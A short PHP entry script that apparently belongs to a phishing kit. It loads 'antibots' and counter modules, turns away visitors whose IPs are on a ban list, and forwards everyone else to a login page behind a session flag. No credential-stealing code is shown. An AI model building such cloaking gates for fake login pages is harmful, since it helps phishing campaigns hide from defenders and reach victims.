<?php

include './config.php';
include './helpers/functions.php';
include './helpers/class/UserInfo.php';
include './helpers/antibots-debug/antibots.php';
include './system/counter/counter.php';




if (file_exists('./helpers/IPBam.txt')) 
{
    comprobateIP('./helpers/IPBam.txt', UserInfo::getIP(), $out_url);
}

header('location: ./login');
$_SESSION['allowed'] = true;


?>
